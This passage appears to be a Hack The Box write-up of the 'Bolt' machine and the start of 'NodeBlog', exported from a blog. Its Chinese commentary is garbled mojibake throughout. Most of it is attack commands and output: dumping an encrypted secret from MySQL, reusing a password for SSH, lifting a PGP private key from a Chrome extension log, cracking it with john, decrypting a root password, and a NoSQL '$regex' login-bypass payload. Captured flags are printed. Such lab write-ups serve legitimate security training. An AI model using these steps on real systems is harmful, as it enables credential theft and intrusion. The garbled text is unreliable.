\n\nä¸è¿‡å‘ç°è¿˜æœ‰ä¸€ä¸ªsecretsçš„å­—æ®µï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```sql\nmysql> desc secrets;\ndesc secrets;\n+-------------+------------+------+-----+---------+-------+\n| Field       | Type       | Null | Key | Default | Extra |\n+-------------+------------+------+-----+---------+-------+\n| id          | char(36)   | NO   | PRI | NULL    |       |\n| user_id     | char(36)   | NO   | MUL | NULL    |       |\n| resource_id | char(36)   | NO   | MUL | NULL    |       |\n| data        | mediumtext | NO   |     | NULL    |       |\n| created     | datetime   | NO   |     | NULL    |       |\n| modified    | datetime   | NO   |     | NULL    |       |\n+-------------+------------+------+-----+---------+-------+\n6 rows in set (0.01 sec)\n\nmysql> select data from secrets;\nselect data from secrets;\n-----BEGIN PGP MESSAGE-----\nVersion: OpenPGP.js v4.10.9\nComment: https://openpgpjs.org\n\nwcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc\ng/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY\npCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H\noAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px\nl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R\nzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp\nedLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u\nl0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt\noPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7\nFUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov\n8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey\n5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY\nNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a\nIebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs\nnO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6\nTQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984\n=P38i\n-----END PGP MESSAGE-----\n```\nä½†æ˜¯æ²¡æœ‰ç§é’¥æˆ‘ä»¬ä¾ç„¶æ— æ³•è¿›è¡Œåˆ©ç”¨ï¼Œå°è¯•ä½¿ç”¨æ•°æ®åº“çš„å¯†ç æ¥ç™»é™†eddieè´¦æˆ·\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh eddie@bolt.htb                                      \neddie@bolt.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nYour Hardware Enablement Stack (HWE) is supported until April 2025.\nYou have mail.\nLast login: Fri Jan  7 21:38:40 2022 from 10.10.14.56\neddie@bolt:~$ whoami&&id\neddie\nuid=1000(eddie) gid=1000(eddie) groups=1000(eddie)\n```\nç™»é™†æˆåŠŸï¼Œé‚£æˆ‘ä»¬åˆšæ‰ä¸æ˜¯ç™½æ‰¾äº†ï¼Ÿ\n\n```sql\neddie@bolt:~$ cat user.txt \n483ad2fdf8e588c500b8a58b286ffb8b\n```\næˆåŠŸæ‹¿åˆ°userå…¨æ–°çš„flagæ–‡ä»¶\n\n### Root\nåœ¨/var/mailä¸‹æ‰¾åˆ°äº†ä¸€å°åä¸ºeddieçš„é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\neddie@bolt:~$ cat /var/mail/eddie\nFrom clark@bolt.htb  Thu Feb 25 14:20:19 2021\nReturn-Path: <clark@bolt.htb>\nX-Original-To: eddie@bolt.htb\nDelivered-To: eddie@bolt.htb\nReceived: by bolt.htb (Postfix, from userid 1001)\n        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nSubject: Important!\nTo: <eddie@bolt.htb>\nX-Mailer: mail (GNU Mailutils 3.7)\nMessage-Id: <20210225212019.DFF264CD@bolt.htb>\nDate: Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nFrom: Clark Griswold <clark@bolt.htb>\n\nHey Eddie,\n\nThe password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.\nOnce you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...\n\n-Clark\n```\nè¿™é‡Œçš„å¤§æ¦‚æ„æ€å°±æ˜¯Clarkç”¨æˆ·å‘äº†ä¸€å°é‚®ä»¶ï¼Œå‘Šè¯‰Eddieç”¨æˆ·ï¼Œè¦æ³¨æ„å¤‡ä»½ç§é’¥ã€‚æ—¢ç„¶æç¤ºé‡Œå·²ç»è¯´äº†å¤‡ä»½ï¼Œé‚£è‚¯å®šå°±æœ‰ï¼Œå’±ä»¬å»æ‰¾å‡ºæ¥å°±å¥½\n\n```bash\neddie@bolt:~$ grep -iR \"BEGIN PGP\"\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:    if (!message.match(/-----BEGIN PGP MESSAGE-----/)) {\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----';\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  const reHeader = /^-----BEGIN PGP (MESSAGE, PART \\d+\\/\\d+|MESSAGE, PART \\d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m;\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  // BEGIN PGP MESSAGE, PART X/Y\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:    // BEGIN PGP MESSAGE, PART X\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      // BEGIN PGP SIGNED MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:        // BEGIN PGP MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:          // BEGIN PGP PUBLIC KEY BLOCK\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // BEGIN PGP SIGNATURE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"/\" + parttotal + \"-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"\\r\\n-----BEGIN PGP SIGNED MESSAGE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"\\r\\n-----BEGIN PGP SIGNATURE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP MESSAGE-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\n\");\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP SIGNATURE-----\\r\\n\");\nBinary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches\n.viminfo:~MSle0~/BEGIN PGP\n.viminfo::/BEGIN PGP\n.viminfo:|2,0,1642385169,,\"/BEGIN PGP\"\n.viminfo:? BEGIN PGP\n.viminfo:|2,1,1642385169,,\"BEGIN PGP\"\n```\nåœ¨eddieç”¨æˆ·çš„ç›®å½•ä¸‹æœç´¢BEGIN PGPå¯å¾—åˆ°ä¸€äº›å­˜åœ¨ä»¤ç‰Œçš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹å‘ç°ä¸»è¦ç€çœ¼äº.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.logè¿™ä¸ªæ–‡ä»¶\n\næ­£å¸¸æŸ¥çœ‹çš„æ—¶å€™æ˜¯ä¸€å †ä¹±ç ï¼Œæˆ‘ä»¬ä½¿ç”¨vimæ‰“å¼€ï¼Œç„¶åä½¿ç”¨å‘½ä»¤æ¨¡å¼è¾“å…¥%s/\\\\\\\\r\\\\\\\\n/\\\\r/gï¼Œå³å¯è¿›å…¥åªç®¡å¯çœ‹çš„çŠ¶æ€\n\nç„¶åå¾—åˆ°äº†ä¸€ä¸²gpg\n\n```bash\n-----BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: OpenPGP.js v4.10.9\nComment: https://openpgpjs.org\n\n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\nPSwYYWlAywj5\n=cqxZ\n-----END PGP PRIVATE KEY BLOCK-----\n```\nä¿å­˜åˆ°æ¡Œé¢\n\nä½¿ç”¨gpg2johnç»™è½¬æ¢ä¸ºhashæ ¼å¼\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gpg2john gpg.key > gpg.hash\n\nFile gpg.key\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat gpg.hash               \nEddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::gpg.key\n```\nä½¿ç”¨johnè¿›è¡Œçˆ†ç ´hash\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 16777216 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmerrychristmas   (Eddie Johnson)\n1g 0:00:14:54 DONE (2022-01-16 22:08) 0.001118g/s 47.90p/s 47.90c/s 47.90C/s mhines..menudo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\nç›´æ¥ä½¿ç”¨çˆ†ç ´å‡ºæ¥çš„hashæ˜¯æ— æ³•ç™»å½•çš„\n\nç°åœ¨è®©æˆ‘ä»¬æ¥è§£å¯†å¾—åˆ°çš„åŠ å¯†ä¿¡æ¯ï¼Œé¦–å…ˆéœ€è¦å¯¼å…¥Eddieç”¨æˆ·çš„å…¬é’¥å’Œç§é’¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gpg --batch --import gpg.key \ngpg: é’¥åŒ™ç®±â€˜/root/.gnupg/pubring.kbxâ€™å·²åˆ›å»º\ngpg: /root/.gnupg/trustdb.gpgï¼šå»ºç«‹äº†ä¿¡ä»»åº¦æ•°æ®åº“\ngpg: å¯†é’¥ 1C2741A3DC3B4ABDï¼šå…¬é’¥ â€œEddie Johnson <eddie@bolt.htb>â€ å·²å¯¼å…¥\ngpg: å¯†é’¥ 1C2741A3DC3B4ABDï¼šç§é’¥å·²å¯¼å…¥\ngpg: å¤„ç†çš„æ€»æ•°ï¼š1\ngpg:               å·²å¯¼å…¥ï¼š1\ngpg:       è¯»å–çš„ç§é’¥ï¼š1\ngpg:   å¯¼å…¥çš„ç§é’¥ï¼š1\n```\nç°åœ¨æˆ‘ä»¬å·²ç»å¯¼å…¥äº†ç§é’¥ï¼Œæ¥ä¸‹æ¥éœ€è¦è§£å¯†åŠ å¯†ä¿¡æ¯\n\nå°†åœ¨mysqlæ•°æ®åº“ä¸­è¯»å–åˆ°çš„å¯†é’¥ä¿å­˜ä¸ºgpg.ascæ–‡ä»¶\n\nç„¶åè¿›è¡Œè¯»å–\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gpg --pinentry-mode loopback --passphrase merrychristmas -d gpg.asc\ngpg: ç”± 2048 ä½çš„ RSA å¯†é’¥åŠ å¯†ï¼Œæ ‡è¯†ä¸º F65CA879A3D77FE4ï¼Œç”Ÿæˆäº 2021-02-25\n      â€œEddie Johnson <eddie@bolt.htb>â€\n{\"password\":\"Z(2rmxsNW(Z?3=p/9s\",\"description\":\"\"}gpg: ç­¾åå»ºç«‹äº 2021å¹´03æœˆ06æ—¥ æ˜ŸæœŸå…­ 10æ—¶33åˆ†54ç§’ EST\ngpg:               ä½¿ç”¨ RSA å¯†é’¥ 1C2741A3DC3B4ABD\ngpg: å®Œå¥½çš„ç­¾åï¼Œæ¥è‡ªäº â€œEddie Johnson <eddie@bolt.htb>â€ [æœªçŸ¥]\ngpg: è­¦å‘Šï¼šæ­¤å¯†é’¥æœªè¢«å—ä¿¡ä»»ç­¾åè®¤è¯ï¼\ngpg:       æ²¡æœ‰è¯æ®è¡¨æ˜æ­¤ç­¾åå±äºå…¶å£°ç§°çš„æ‰€æœ‰è€…ã€‚\nä¸»å¯†é’¥æŒ‡çº¹ï¼š DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD\n```\nè¯¥rootç”¨æˆ·æ— æ³•ä½¿ç”¨sshç™»å½•ï¼Œåªèƒ½ç”¨eddieè´¦æˆ·æ¥åˆ‡æ¢è¿‡å»\n\n```bash\neddie@bolt:~$ su -\nPassword: \nroot@bolt:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸåˆ‡æ¢åˆ°rootæƒé™\n\n```bash\nroot@bolt:~# ls\nroot.txt  snap\nroot@bolt:~# cat root.txt \na351a21d0cfab4c55dac1cb648369408\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"NodeBlog - Hackthebox","url":"/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/","content":"\n# Hackthebox - NodeBlog\n## é¶åœºä¿¡æ¯\n![image](Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png)\n\n## é¶åœºç±»å‹\n![image](Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139  \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 20:19 EST\nNmap scan report for 10.10.11.139\nHost is up (0.23s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\n|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\n5000/tcp open  http    Node.js (Express middleware)\n|_http-title: Blog\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/19%OT=22%CT=1%CU=34477%PV=Y%DS=2%DC=T%G=Y%TM=61E8B8C\nOS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1\nOS:00%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   221.92 ms 10.10.14.1\n2   222.21 ms 10.10.11.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.53 seconds\n```\nå»çœ‹ä¸€ä¸‹5000ç«¯å£\n\n![image](Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png)\n\nå»çœ‹çœ‹ç™»é™†å¤„\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":\"123\"}' -H 'Content-Type: application/json' | grep Invalid\n            Invalid Password\n```\nä½¿ç”¨è´¦å·adminæç¤ºå¯†ç æ— æ•ˆ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl 10.10.11.139:5000/login -sd '{\"user\":\"admin1\",\"password\":\"123\"}' -H 'Content-Type: application/json' | grep Invalid\n            Invalid Username\n```\nä½¿ç”¨è´¦å·admin1æç¤ºè´¦å·æ— æ•ˆ\n\nå¾—å‡ºç»“è®ºï¼šè¿™é‡Œå¯ä»¥çˆ†ç ´è´¦å·\n\nä½†æ˜¯fuzzåæ²¡æœ‰å‘ç°å¯ä»¥å…¶ä»–è´¦å·ï¼Œä¹Ÿæ²¡æœ‰çˆ†ç ´è¿›å»\n\næ¥ç€æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰å…¶ä»–æ¼æ´ï¼Œä¾‹å¦‚æ³¨å…¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"\"}}' -H 'Content-Type: 